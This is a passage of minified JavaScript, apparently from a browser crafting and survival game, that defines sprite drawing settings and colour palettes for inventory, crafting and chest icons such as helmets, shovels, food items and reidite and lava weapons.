          c: ["#2a2938", "#242330", "#313041", "#1b1a25"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_WINTER_HOOD] = sprite[Ie.INV_WINTER_HOOD];
        sprite[Ie.INV_HOOD] = ci(1, [{
          f: tn,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#2a2938", "#242330", "#313041"]
        }], 0.25, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_HOOD] = sprite[Ie.INV_HOOD];
        sprite[Ie.INV_WINTER_PEASANT] = ci(1, [{
          f: nn,
          x: 0,
          y: 3,
          a: 1,
          r: 0,
          c: ["#1d1d22", "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"]
        }], 0.39, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_WINTER_PEASANT] = sprite[Ie.INV_WINTER_PEASANT];
        sprite[Ie.INV_PEASANT] = ci(1, [{
          f: nn,
          x: 0,
          y: 3,
          a: 1,
          r: 0,
          c: ["#1d1d22", "#8c7654", "#785f4c", "#a88e6c", "#785f4c", "#705845"]
        }], 0.39, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_PEASANT] = sprite[Ie.INV_PEASANT];
        sprite[Ie.INV_CROWN_GREEN] = ci(1, [{
          f: cn,
          x: 0,
          y: 10,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#49B669", "#19994C", "#71C187"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CROWN_GREEN] = sprite[Ie.INV_CROWN_GREEN];
        sprite[Ie.INV_CROWN_ORANGE] = ci(1, [{
          f: cn,
          x: 0,
          y: 10,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#C45727", "#994617", "#DB9358"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CROWN_ORANGE] = sprite[Ie.INV_CROWN_ORANGE];
        sprite[Ie.INV_CROWN_BLUE] = ci(1, [{
          f: cn,
          x: 0,
          y: 10,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#2792C1", "#196599", "#59C0D8"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CROWN_BLUE] = sprite[Ie.INV_CROWN_BLUE];
        sprite[Ie.INV_CROWN_CRAB] = ci(1, [{
          f: St,
          x: -1,
          y: 0,
          a: 1,
          r: 0,
          c: ["#000000", "#b03431", "#94312d", "#bd3c33", "#de5445"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CROWN_CRAB] = sprite[Ie.INV_CROWN_CRAB];
        sprite[Ie.CHEST_CROWN_CRAB] = sprite[Ie.INV_CROWN_CRAB];
        sprite[Ie.INV_DRAGON_HELMET] = ci(1, [{
          f: jt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#cae9eb", "#75bcae", "#ffffff", "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"]
        }], 0.2, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DRAGON_HELMET] = sprite[Ie.INV_DRAGON_HELMET];
        sprite[Ie.INV_DRAGON_SWORD] = ci(1, [{
          f: Br,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#284c4a", "#193533", "#c7efef", "#7fccca"]
        }], 0.75, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DRAGON_SWORD] = sprite[Ie.INV_DRAGON_SWORD];
        sprite[Ie.INV_DRAGON_CUBE] = ci(1, [{
          f: Vr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
        }], 0.55, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_DRAGON_ORB] = ci(1, [{
          f: Wr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
        }], 0.55, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_LAVA_CUBE] = ci(1, [{
          f: Vr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
        }], 0.55, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_LAVA_ORB] = ci(1, [{
          f: Wr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
        }], 0.55, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_GEMME_GREEN] = ci(1, [{
          f: Pr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#59ba72", "#94d966", "#5aa628", "#0d1b1c", "#38874d"]
        }], 0.35, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_GEMME_ORANGE] = ci(1, [{
          f: Pr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#C45727", "#de7d46", "#DB9358", "#0d1b1c", "#994617"]
        }], 0.35, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_GEMME_BLUE] = ci(1, [{
          f: Pr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#3a9dbd", "#59C0D8", "#48abcb", "#0d1b1c", "#196599"]
        }], 0.35, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_SHOVEL] = ci(1, [{
          f: Tn,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#6d5041", "#4f3d35", "#939393", "#5f6061", "#757575"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SHOVEL] = sprite[Ie.INV_SHOVEL];
        sprite[Ie.INV_SHOVEL_GOLD] = ci(1, [{
          f: Tn,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32", "#b4ac45"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SHOVEL_GOLD] = sprite[Ie.INV_SHOVEL_GOLD];
        sprite[Ie.INV_SHOVEL_DIAMOND] = ci(1, [{
          f: Tn,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1", "#42aab8"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SHOVEL_DIAMOND] = sprite[Ie.INV_SHOVEL_DIAMOND];
        sprite[Ie.INV_SHOVEL_AMETHYST] = ci(1, [{
          f: Tn,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa", "#a853c7"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SHOVEL_AMETHYST] = sprite[Ie.INV_SHOVEL_AMETHYST];
        sprite[Ie.INV_EXPLORER_HAT] = ci(1, [{
          f: ur,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"]
        }], 0.35, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_EXPLORER_HAT] = sprite[Ie.INV_EXPLORER_HAT];
        sprite[Ie.INV_WOOD_HELMET] = ci(1, [{
          f: lr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#252525", "#73583e", "#493425", "#7d6144"]
        }], 0.35, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_WOOD_HELMET] = sprite[Ie.INV_WOOD_HELMET];
        sprite[Ie.INV_STONE_HELMET] = ci(1, [{
          f: Or,
          x: 0,
          y: -2,
          a: 1,
          r: 0,
          c: ["#252525", "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", "#555555", "#747474", "#969696", "#454545"]
        }], 0.4, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_STONE_HELMET] = sprite[Ie.INV_STONE_HELMET];
        sprite[Ie.INV_GOLD_HELMET] = ci(1, [{
          f: cr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#dbce71", "#b29c32", "#c4bc51"]
        }], 0.35, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_GOLD_HELMET] = sprite[Ie.INV_GOLD_HELMET];
        sprite[Ie.INV_DIAMOND_HELMET] = ci(1, [{
          f: Rr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#717171", "#485252", "#555555", "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DIAMOND_HELMET] = sprite[Ie.INV_DIAMOND_HELMET];
        sprite[Ie.INV_BOOK] = ci(1, [{
          f: Cr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#511f00", "#2f1300", "#ffffff", "#d4d4d4", "#5b2400", "#984e21"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_BOOK] = sprite[Ie.INV_BOOK];
        sprite[Ie.INV_PAPER] = ci(1, [{
          f: Nr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#221e1b", "#ffffff", "#f6f0e7"]
        }], 0.3, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_PAPER] = sprite[Ie.INV_PAPER];
        sprite[Ie.INV_AMETHYST] = ci(1, [{
          f: er,
          x: -5,
          y: -5,
          a: 1,
          r: 0,
          c: ["#1d051e", "#c27add", "#cd98e5"]
        }], 0.31, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_SAND] = ci(1, [{
          f: Jr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#D7C393", "#a48c6c"]
        }], 0.22, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_ICE] = ci(1, [{
          f: Xr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#93CBCE", "#E9F6F6"]
        }], 0.3, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_GROUND] = ci(1, [{
          f: Jr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#866432", "#6b4f25"]
        }], 0.22, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_BUCKET_FULL] = ci(1, [{
          f: En,
          x: 3,
          y: 2,
          a: 1,
          r: 0,
          c: ["#1e2021", "#674C2A", "#4C3B19", "#2f2211", "#785931", "#1678a2"]
        }], 0.22, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_BUCKET_EMPTY] = ci(1, [{
          f: _n,
          x: 3,
          y: 2,
          a: 1,
          r: 0,
          c: ["#1e2021", "#674C2A", "#4C3B19", "#2f2211", "#785931", "#1678a2"]
        }], 0.22, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_BUCKET_FULL] = sprite[Ie.INV_BUCKET_FULL];
        sprite[Ie.CRAFT_BUCKET_EMPTY] = sprite[Ie.INV_BUCKET_EMPTY];
        sprite[Ie.INV_WELL] = ci(1, [{
          f: xr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#454545"]
        }], 0.1, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WELL] = sprite[Ie.INV_WELL];
        sprite[Ie.INV_BOTTLE_FULL] = ci(1, [{
          f: on,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]
        }], 0.18, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_BOTTLE_EMPTY] = ci(1, [{
          f: sn,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]
        }], 0.18, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_BOTTLE_FULL] = sprite[Ie.INV_BOTTLE_FULL];
        sprite[Ie.CRAFT_BOTTLE_EMPTY] = sprite[Ie.INV_BOTTLE_EMPTY];
        sprite[Ie.INV_COOKIE] = ci(1, [{
          f: Ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#eedacc", "#dfbda7", "#dab094", "#63391a", "#523124"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_COOKIE] = sprite[Ie.INV_COOKIE];
        sprite[Ie.INV_CANDY] = ci(1, [{
          f: Xi,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1a1011", "#e29c2b", "#b76413", "#d6c418", "#e0bf32", "#b78a1a", "#aa1a17", "#cc9f2f", "#cc741d", "#b51524", "#bc1522", "#991922", "#a01ed5", "#d51e81"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_FERRERO] = ci(1, [{
          f: qi,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1a1011", "#693c2a", "#54311f", "#9f7a3d", "#492d1d", "#dbb175", "#54311f", "#9f7a3d", "#604720"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_BREAD] = ci(1, [{
          f: Kr,
          x: 0,
          y: -2,
          a: 1,
          r: 0,
          c: ["#1d051e", "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
        }], 0.17, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BREAD] = sprite[Ie.INV_BREAD];
        sprite[Ie.INV_FOODFISH] = ci(1, [{
          f: Tt,
          x: -3,
          y: -5,
          a: 1,
          r: 0,
          c: ["#1d051e", "#63767c", "#424f51", "#6c8288", "#536468", "#202020", "#ffffff", "#806f60", "#514942", "#756557"]
        }], 0.23, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_FOODFISH_COOKED] = ci(1, [{
          f: At,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1d051e", "#42261A", "#281818"]
        }], 0.23, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_FOODFISH_COOKED] = sprite[Ie.INV_FOODFISH_COOKED];
        sprite[Ie.INV_DIVING_MASK] = ci(1, [{
          f: st,
          x: -3,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#65A8B7", "#2E85A0", "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", "#2E85A0"]
        }], 0.2, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DIVING_MASK] = sprite[Ie.INV_DIVING_MASK];
        sprite[Ie.INV_SCALES] = ci(1, [{
          f: Ai,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#961B1B", "#702727", "#C43B3B"]
        }], 0.15, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_SUPER_DIVING_SUIT] = ci(1, [{
          f: _t,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#F0D200", "#B09A00", "#79359E", "#652D8E", "#1e2021"]
        }], 0.3, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SUPER_DIVING_SUIT] = sprite[Ie.INV_SUPER_DIVING_SUIT];
        sprite[Ie.INV_PLOT] = ci(1, [{
          f: qr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#352E1E", "#4C3B19", "#574122"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_PLOT] = sprite[Ie.INV_PLOT];
        sprite[Ie.INV_GARLAND] = ci(1, [{
          f: ke,
          x: -5,
          y: -5,
          a: 1,
          r: 0,
          c: ["#e2d63b", "#ee71a9", "#42b672"]
        }], 1, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_GARLAND] = sprite[Ie.INV_GARLAND];
        sprite[Ie.INV_BRIDGE] = ci(1, [{
          f: Fr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#332715", "#4C3B19", "#574122"]
        }], 0.5, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BRIDGE] = sprite[Ie.INV_BRIDGE];
        sprite[Ie.INV_ROOF] = ci(1, [{
          f: xe,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#352618", "#402b18", "#4c3b19", "#574122", "#52391e"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_ROOF] = sprite[Ie.INV_ROOF];
        sprite[Ie.INV_WATERING_CAN_FULL] = ci(1, [{
          f: jr,
          x: -1,
          y: 0,
          a: 1,
          r: -Math.PI / 5,
          c: ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#1678a2"]
        }], 0.4, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.7);
        sprite[Ie.CRAFT_WATERING_CAN_FULL] = sprite[Ie.INV_WATERING_CAN_FULL];
        sprite[Ie.INV_WATERING_CAN] = ci(1, [{
          f: jr,
          x: -1,
          y: 0,
          a: 1,
          r: -Math.PI / 5,
          c: ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#3F2D18", "#2D2112"]
        }], 0.4, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_WATERING_CAN] = sprite[Ie.INV_WATERING_CAN];
        sprite[Ie.INV_FLOUR] = ci(1, [{
          f: Qr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
        }], 0.25, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_CRAB_STICK] = ci(1, [{
          f: Ui,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#ed5f4f", "#ce4545", "#ffffff", "#e2dad7"]
        }], 0.2, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_CRAB_STICK] = sprite[Ie.INV_CRAB_STICK];
        sprite[Ie.INV_CAKE] = ci(1, [{
          f: Et,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#1e2021", "#63391a", "#523124", "#d2c4b9", "#c1aca2", "#d8cbc2", "#c8b5ac", "#ac222a", "#e6636a"]
        }], 0.25, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_CAKE] = sprite[Ie.INV_CAKE];
        sprite[Ie.INV_SANDWICH] = ci(1, [{
          f: Ti,
          x: -2,
          y: -8,
          a: 1,
          r: 0,
          c: ["#dfd6bc", "#7b5139", "#bf8d50", "#834e49", "#602820", "#d7ccaa"]
        }], 0.25, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_SANDWICH] = sprite[Ie.INV_SANDWICH];
        sprite[Ie.INV_LAVA_SWORD] = [];
        sprite[Ie.INV_LAVA_SWORD][0] = IMAGES.INV_LAVA_SWORD_OUT;
        sprite[Ie.INV_LAVA_SWORD][1] = IMAGES.INV_LAVA_SWORD_IN;
        sprite[Ie.INV_LAVA_SWORD][2] = IMAGES.INV_LAVA_SWORD_CLICK;
        sprite[Ie.CRAFT_LAVA_SWORD] = sprite[Ie.INV_LAVA_SWORD];
        sprite[Ie.CHEST_LAVA_SWORD] = sprite[Ie.INV_LAVA_SWORD];
        sprite[Ie.INV_LAVA_SPEAR] = [];
        sprite[Ie.INV_LAVA_SPEAR][0] = IMAGES.INV_LAVA_SPEAR_OUT;
        sprite[Ie.INV_LAVA_SPEAR][1] = IMAGES.INV_LAVA_SPEAR_IN;
        sprite[Ie.INV_LAVA_SPEAR][2] = IMAGES.INV_LAVA_SPEAR_CLICK;
        sprite[Ie.CRAFT_LAVA_SPEAR] = sprite[Ie.INV_LAVA_SPEAR];
        sprite[Ie.CHEST_LAVA_SPEAR] = sprite[Ie.INV_LAVA_SPEAR];
        sprite[Ie.CRAFT_REIDITE_SWORD] = sprite[Ie.INV_REIDITE_SWORD];
        sprite[Ie.CHEST_REIDITE_SWORD] = sprite[Ie.INV_REIDITE_SWORD];
        sprite[Ie.INV_REIDITE_SWORD] = [];
        sprite[Ie.INV_REIDITE_SWORD][0] = IMAGES.INV_REIDITE_SWORD_OUT;
        sprite[Ie.INV_REIDITE_SWORD][1] = IMAGES.INV_REIDITE_SWORD_IN;
        sprite[Ie.INV_REIDITE_SWORD][2] = IMAGES.INV_REIDITE_SWORD_CLICK;
        sprite[Ie.CRAFT_REIDITE_SWORD] = sprite[Ie.INV_REIDITE_SWORD];
        sprite[Ie.CHEST_REIDITE_SWORD] = sprite[Ie.INV_REIDITE_SWORD];
        sprite[Ie.INV_REIDITE_SPEAR] = [];
        sprite[Ie.INV_REIDITE_SPEAR][0] = IMAGES.INV_REIDITE_SPEAR_OUT;
        sprite[Ie.INV_REIDITE_SPEAR][1] = IMAGES.INV_REIDITE_SPEAR_IN;
        sprite[Ie.INV_REIDITE_SPEAR][2] = IMAGES.INV_REIDITE_SPEAR_CLICK;
        sprite[Ie.CRAFT_REIDITE_SPEAR] = sprite[Ie.INV_REIDITE_SPEAR];
        sprite[Ie.CHEST_REIDITE_SPEAR] = sprite[Ie.INV_REIDITE_SPEAR];
        sprite[Ie.INV_DIAMOND_PROTECTION] = [];
        sprite[Ie.INV_DIAMOND_PROTECTION][0] = IMAGES.INV_DIAMOND_PROTECTION_OUT;
        sprite[Ie.INV_DIAMOND_PROTECTION][1] = IMAGES.INV_DIAMOND_PROTECTION_IN;
        sprite[Ie.INV_DIAMOND_PROTECTION][2] = IMAGES.INV_DIAMOND_PROTECTION_CLICK;
        sprite[Ie.CRAFT_DIAMOND_PROTECTION] = sprite[Ie.INV_DIAMOND_PROTECTION];
        sprite[Ie.CHEST_DIAMOND_PROTECTION] = sprite[Ie.INV_DIAMOND_PROTECTION];
        sprite[Ie.INV_AMETHYST_PROTECTION] = [];
        sprite[Ie.INV_AMETHYST_PROTECTION][0] = IMAGES.INV_AMETHYST_PROTECTION_OUT;
        sprite[Ie.INV_AMETHYST_PROTECTION][1] = IMAGES.INV_AMETHYST_PROTECTION_IN;
        sprite[Ie.INV_AMETHYST_PROTECTION][2] = IMAGES.INV_AMETHYST_PROTECTION_CLICK;
        sprite[Ie.CRAFT_AMETHYST_PROTECTION] = sprite[Ie.INV_AMETHYST_PROTECTION];
        sprite[Ie.CHEST_AMETHYST_PROTECTION] = sprite[Ie.INV_AMETHYST_PROTECTION];
        sprite[Ie.INV_REIDITE_PROTECTION] = [];
        sprite[Ie.INV_REIDITE_PROTECTION][0] = IMAGES.INV_REIDITE_PROTECTION_OUT;
        sprite[Ie.INV_REIDITE_PROTECTION][1] = IMAGES.INV_REIDITE_PROTECTION_IN;
        sprite[Ie.INV_REIDITE_PROTECTION][2] = IMAGES.INV_REIDITE_PROTECTION_CLICK;
        sprite[Ie.CRAFT_REIDITE_PROTECTION] = sprite[Ie.INV_REIDITE_PROTECTION];
        sprite[Ie.CHEST_REIDITE_PROTECTION] = sprite[Ie.INV_REIDITE_PROTECTION];
        sprite[Ie.INV_REIDITE_HELMET] = [];
        sprite[Ie.INV_REIDITE_HELMET][0] = IMAGES.INV_REIDITE_HELMET_OUT;
        sprite[Ie.INV_REIDITE_HELMET][1] = IMAGES.INV_REIDITE_HELMET_IN;
        sprite[Ie.INV_REIDITE_HELMET][2] = IMAGES.INV_REIDITE_HELMET_CLICK;
        sprite[Ie.CRAFT_REIDITE_HELMET] = sprite[Ie.INV_REIDITE_HELMET];
        sprite[Ie.CHEST_REIDITE_HELMET] = sprite[Ie.INV_REIDITE_HELMET];
        sprite[Ie.INV_LAVA_HELMET] = [];
        sprite[Ie.INV_LAVA_HELMET][0] = IMAGES.INV_LAVA_HELMET_OUT;
        sprite[Ie.INV_LAVA_HELMET][1] = IMAGES.INV_LAVA_HELMET_IN;
        sprite[Ie.INV_LAVA_HELMET][2] = IMAGES.INV_LAVA_HELMET_CLICK;
        sprite[Ie.CRAFT_LAVA_HELMET] = sprite[Ie.INV_LAVA_HELMET];
        sprite[Ie.CHEST_LAVA_HELMET] = sprite[Ie.INV_LAVA_HELMET];
        sprite[Ie.INV_FIREFLY] = [];
        sprite[Ie.INV_FIREFLY][0] = IMAGES.INV_FIREFLY_OUT;
        sprite[Ie.INV_FIREFLY][1] = IMAGES.INV_FIREFLY_IN;
        sprite[Ie.INV_FIREFLY][2] = IMAGES.INV_FIREFLY_CLICK;
        sprite[Ie.CRAFT_FIREFLY] = sprite[Ie.INV_FIREFLY];
        sprite[Ie.CHEST_FIREFLY] = sprite[Ie.INV_FIREFLY];
        sprite[Ie.INV_WITCH] = [];
        sprite[Ie.INV_WITCH][0] = IMAGES.INV_WITCH_OUT;
        sprite[Ie.INV_WITCH][1] = IMAGES.INV_WITCH_IN;
        sprite[Ie.INV_WITCH][2] = IMAGES.INV_WITCH_CLICK;
        sprite[Ie.CRAFT_WITCH] = sprite[Ie.INV_WITCH];
        sprite[Ie.CHEST_WITCH] = sprite[Ie.INV_WITCH];
        sprite[Ie.INV_NIMBUS] = [];
        sprite[Ie.INV_NIMBUS][0] = IMAGES.INV_NIMBUS_OUT;
        sprite[Ie.INV_NIMBUS][1] = IMAGES.INV_NIMBUS_IN;
        sprite[Ie.INV_NIMBUS][2] = IMAGES.INV_NIMBUS_CLICK;
        sprite[Ie.CRAFT_NIMBUS] = sprite[Ie.INV_NIMBUS];
        sprite[Ie.CHEST_NIMBUS] = sprite[Ie.INV_NIMBUS];
        sprite[Ie.INV_REIDITE] = [];
        sprite[Ie.INV_REIDITE][0] = IMAGES.INV_REIDITE_OUT;
        sprite[Ie.INV_REIDITE][1] = IMAGES.INV_REIDITE_IN;
        sprite[Ie.INV_REIDITE][2] = IMAGES.INV_REIDITE_CLICK;
        sprite[Ie.CHEST_REIDITE] = sprite[Ie.INV_REIDITE];
        sprite[Ie.INV_FLAME] = [];
        sprite[Ie.INV_FLAME][0] = IMAGES.INV_FLAME_OUT;
        sprite[Ie.INV_FLAME][1] = IMAGES.INV_FLAME_IN;
        sprite[Ie.INV_FLAME][2] = IMAGES.INV_FLAME_CLICK;
        sprite[Ie.CHEST_FLAME] = sprite[Ie.INV_FLAME];
        sprite[Ie.CHEST_SHOVEL] = sprite[Ie.INV_SHOVEL];
        sprite[Ie.CHEST_SHOVEL_GOLD] = sprite[Ie.INV_SHOVEL_GOLD];
        sprite[Ie.CHEST_SHOVEL_DIAMOND] = sprite[Ie.INV_SHOVEL_DIAMOND];
        sprite[Ie.CHEST_SHOVEL_AMETHYST] = sprite[Ie.INV_SHOVEL_AMETHYST];
        sprite[Ie.CHEST_SEED] = sprite[Ie.INV_SEED];
        sprite[Ie.CHEST_WHEAT_SEED] = sprite[Ie.INV_WHEAT_SEED];
        sprite[Ie.CHEST_WINDMILL] = sprite[Ie.INV_WINDMILL];
        sprite[Ie.CHEST_WILD_WHEAT] = sprite[Ie.INV_WILD_WHEAT];
        sprite[Ie.CHEST_FIRE] = sprite[Ie.INV_FIRE];
        sprite[Ie.CHEST_DRAGON_ORB] = sprite[Ie.INV_DRAGON_ORB];
        sprite[Ie.CHEST_DRAGON_CUBE] = sprite[Ie.INV_DRAGON_CUBE];
        sprite[Ie.CHEST_LAVA_ORB] = sprite[Ie.INV_LAVA_ORB];
        sprite[Ie.CHEST_LAVA_CUBE] = sprite[Ie.INV_LAVA_CUBE];
        sprite[Ie.CHEST_BIG_FIRE] = sprite[Ie.INV_BIG_FIRE];
        sprite[Ie.CHEST_SUGAR_CAN] = sprite[Ie.INV_SUGAR_CAN];
        sprite[Ie.CHEST_PIRATE_SWORD] = sprite[Ie.INV_PIRATE_SWORD];
        sprite[Ie.CHEST_SWORD_WOOD] = sprite[Ie.INV_SWORD_WOOD];
        sprite[Ie.CHEST_SWORD] = sprite[Ie.INV_SWORD];
        sprite[Ie.CHEST_CURSED_SWORD] = sprite[Ie.INV_CURSED_SWORD];
        sprite[Ie.CHEST_SWORD_GOLD] = sprite[Ie.INV_SWORD_GOLD];
        sprite[Ie.CHEST_SWORD_DIAMOND] = sprite[Ie.INV_SWORD_DIAMOND];
